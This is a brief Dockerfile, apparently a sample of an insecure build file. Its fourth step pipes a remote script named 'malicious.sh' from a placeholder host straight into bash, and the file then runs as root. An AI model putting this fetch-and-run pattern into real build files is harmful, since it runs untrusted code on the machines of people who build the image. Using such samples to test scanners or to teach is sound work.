FROM ubuntu:latest
RUN apt-get update && apt-get install -y curl wget
COPY . /app
WORKDIR /app
RUN curl -sSL https://example.com/malicious.sh | bash
USER root
CMD ["bash"]
